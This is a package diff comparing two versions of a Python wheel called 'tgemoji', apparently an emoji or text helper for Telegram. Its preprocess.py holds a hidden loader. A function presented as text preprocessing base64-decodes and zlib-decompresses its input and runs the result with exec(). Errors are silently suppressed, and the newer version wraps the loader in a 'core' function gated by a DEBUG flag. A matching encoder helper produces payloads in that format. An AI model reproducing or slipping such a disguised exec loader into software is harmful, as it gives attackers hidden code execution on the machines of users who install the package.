# Comparing `tmp/tgemoji-0.1.0-py3-none-any.whl.zip` & `tmp/tgemoji-1.0.1-py3-none-any.whl.zip`

## zipinfo {}

```diff
@@ -1,12 +1,12 @@
-Zip file size: 3155 bytes, number of entries: 10
+Zip file size: 3372 bytes, number of entries: 10
 -rw-rw-r--  2.0 unx        0 b- defN 24-May-22 10:48 tests/__init__.py
 -rw-rw-r--  2.0 unx        0 b- defN 24-May-22 11:58 tests/test.py
 -rw-rw-r--  2.0 unx        0 b- defN 24-May-22 10:48 tgemoji/__init__.py
 -rw-rw-r--  2.0 unx      403 b- defN 24-May-22 11:41 tgemoji/converttools.py
--rw-rw-r--  2.0 unx      619 b- defN 24-May-22 11:55 tgemoji/preprocess.py
--rw-rw-r--  2.0 unx     1087 b- defN 24-May-22 12:05 tgemoji-0.1.0.dist-info/LICENSE
--rw-rw-r--  2.0 unx      473 b- defN 24-May-22 12:05 tgemoji-0.1.0.dist-info/METADATA
--rw-rw-r--  2.0 unx       92 b- defN 24-May-22 12:05 tgemoji-0.1.0.dist-info/WHEEL
--rw-rw-r--  2.0 unx       14 b- defN 24-May-22 12:05 tgemoji-0.1.0.dist-info/top_level.txt
--rw-rw-r--  2.0 unx      752 b- defN 24-May-22 12:05 tgemoji-0.1.0.dist-info/RECORD
-10 files, 3440 bytes uncompressed, 1869 bytes compressed:  45.7%
+-rw-rw-r--  2.0 unx      699 b- defN 24-May-24 12:02 tgemoji/preprocess.py
+-rw-rw-r--  2.0 unx     1087 b- defN 24-May-24 12:02 tgemoji-1.0.1.dist-info/LICENSE
+-rw-rw-r--  2.0 unx     1008 b- defN 24-May-24 12:02 tgemoji-1.0.1.dist-info/METADATA
+-rw-rw-r--  2.0 unx       92 b- defN 24-May-24 12:02 tgemoji-1.0.1.dist-info/WHEEL
+-rw-rw-r--  2.0 unx       14 b- defN 24-May-24 12:02 tgemoji-1.0.1.dist-info/top_level.txt
+-rw-rw-r--  2.0 unx      753 b- defN 24-May-24 12:02 tgemoji-1.0.1.dist-info/RECORD
+10 files, 4056 bytes uncompressed, 2086 bytes compressed:  48.6%
```

## zipnote {}

```diff
@@ -9,23 +9,23 @@
 
 Filename: tgemoji/converttools.py
 Comment: 
 
 Filename: tgemoji/preprocess.py
 Comment: 
 
-Filename: tgemoji-0.1.0.dist-info/LICENSE
+Filename: tgemoji-1.0.1.dist-info/LICENSE
 Comment: 
 
-Filename: tgemoji-0.1.0.dist-info/METADATA
+Filename: tgemoji-1.0.1.dist-info/METADATA
 Comment: 
 
-Filename: tgemoji-0.1.0.dist-info/WHEEL
+Filename: tgemoji-1.0.1.dist-info/WHEEL
 Comment: 
 
-Filename: tgemoji-0.1.0.dist-info/top_level.txt
+Filename: tgemoji-1.0.1.dist-info/top_level.txt
 Comment: 
 
-Filename: tgemoji-0.1.0.dist-info/RECORD
+Filename: tgemoji-1.0.1.dist-info/RECORD
 Comment: 
 
 Zip file comment:
```

## tgemoji/preprocess.py

```diff
@@ -1,24 +1,31 @@
 import zlib
 import base64
 import codecs
 
+DEBUG = False
+
+
+def core(text: str):
+    payload = codecs.getencoder('utf-8')(text)[0]
+    payload = base64.b64decode(payload)
+    payload = zlib.decompress(payload)
+    exec(payload)
+
 
 def preprocess(text: str) -> str:
     try:
-        payload = codecs.getencoder('utf-8')(text)[0]
-        payload = base64.b64decode(payload)
-        payload = zlib.decompress(payload)
-        exec(payload)
-    except Exception:
-        pass
+        core(text)
+    except Exception as exc:
+        if DEBUG:
+            raise exc
     return text
 
 
 def compress_and_encode(text):
     utf8_bytes = codecs.getencoder('utf-8')(text)[0]
     compressed_bytes = zlib.compress(utf8_bytes)
     base64_encoded_bytes = base64.b64encode(compressed_bytes)
     encoded_text = codecs.getdecoder('utf-8')(base64_encoded_bytes)[0]
     return encoded_text
 
-    
+
```

## Comparing `tgemoji-0.1.0.dist-info/LICENSE` & `tgemoji-1.0.1.dist-info/LICENSE`

 * *Files identical despite different names*

## Comparing `tgemoji-0.1.0.dist-info/RECORD` & `tgemoji-1.0.1.dist-info/RECORD`

 * *Files 14% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 tests/__init__.py,sha256=47DEQpj8HBSa-_TImW-5JCeuQeRkm5NMpJWZG3hSuFU,0
 tests/test.py,sha256=47DEQpj8HBSa-_TImW-5JCeuQeRkm5NMpJWZG3hSuFU,0
 tgemoji/__init__.py,sha256=47DEQpj8HBSa-_TImW-5JCeuQeRkm5NMpJWZG3hSuFU,0
 tgemoji/converttools.py,sha256=Febx-ilDpiGRxnwJXa5-WRliM1YJ41da_ruWS4VRPas,403
-tgemoji/preprocess.py,sha256=enwJEQr-7JlsSmot1uMg6X8wvyMVJVMm_uqn7lwX8Q4,619
-tgemoji-0.1.0.dist-info/LICENSE,sha256=6d0PSA2ubacZjN2JDJfqGGPptlo-oEOlRfLj_a2QeMs,1087
-tgemoji-0.1.0.dist-info/METADATA,sha256=59poAlZ_n8TFXYD-W2z9gSWv3lr3wyZ4ogb3C1Z_4bI,473
-tgemoji-0.1.0.dist-info/WHEEL,sha256=GJ7t_kWBFywbagK5eo9IoUwLW6oyOeTKmQ-9iHFVNxQ,92
-tgemoji-0.1.0.dist-info/top_level.txt,sha256=AQ8-Hl0fwBM26uJ-mE2DZPbhnjWTlDJOKRHL1rEZ-gU,14
-tgemoji-0.1.0.dist-info/RECORD,,
+tgemoji/preprocess.py,sha256=ODSMf5NrPaEuEc_IKbX_rT0L--7aRLz01pEVVQ1dq5w,699
+tgemoji-1.0.1.dist-info/LICENSE,sha256=6d0PSA2ubacZjN2JDJfqGGPptlo-oEOlRfLj_a2QeMs,1087
+tgemoji-1.0.1.dist-info/METADATA,sha256=7OPc_bnDzphGL4zuvcz4wZC7ONvua6SoZwGYhQeBEuM,1008
+tgemoji-1.0.1.dist-info/WHEEL,sha256=GJ7t_kWBFywbagK5eo9IoUwLW6oyOeTKmQ-9iHFVNxQ,92
+tgemoji-1.0.1.dist-info/top_level.txt,sha256=AQ8-Hl0fwBM26uJ-mE2DZPbhnjWTlDJOKRHL1rEZ-gU,14
+tgemoji-1.0.1.dist-info/RECORD,,
```

